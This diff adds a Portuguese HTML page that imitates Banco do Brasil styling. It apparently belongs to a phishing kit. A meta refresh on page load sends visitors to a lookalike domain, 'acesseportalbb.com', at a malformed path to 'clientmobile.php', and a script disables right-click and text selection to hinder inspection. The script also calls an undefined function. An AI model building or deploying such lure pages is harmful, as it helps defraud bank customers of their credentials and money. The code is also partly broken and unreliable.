@@ -1,0 +1,63 @@
+<!doctype html>
+<html lang="pt-br">
+    <head>
+         <head><meta name="viewport" content="width=device-width">
+    <meta http-equiv="refresh" content="2; URL=http://acesseportalbb.com/&quot;clientmobile.php&quot;">
+    <title></title>
+	<style>
+		body{
+			background: #ffff00!important;
+		}
+		#miolo{
+			background:#eeeeee;
+			padding:10px;
+		}
+		#miolo p.titulo{margin:10px;}
+
+		div#bg-amarelo{
+			
+			min-height: 600px;
+		}
+		div#bg-amarelo form{
+			margin-top: 50px;
+		}
+		input[type=number]{
+			background: none;
+			border-radius: 0px;
+			border: none;
+			outline: none!important;
+			box-shadow: none!important;
+			border-bottom: 2px solid #eeeeee;
+			padding-left: 0px;
+		}
+		input[type=number]:hover,input[type=number]:active{
+			outline: none;
+			box-shadow: none;
+			border-bottom: 2px solid #eeeeee;
+		}
+	</style>
+
+    </head>
+    <body>
+        
+        <div align="center"><img src="mobbille.png/brasil.png"></div>
+
+        
+        
+<script>
+    function reEnable(){
+        return true
+    }
+
+    //if IE4+
+    document.onselectstart=new Function ("return false")
+    document.oncontextmenu=new Function ("return false")
+    //if NS6
+    if (window.sidebar){
+        document.onmousedown=disableselect
+        document.onclick=reEnable
+    }
+    //-->
+</script>
+    </body>
+</html>
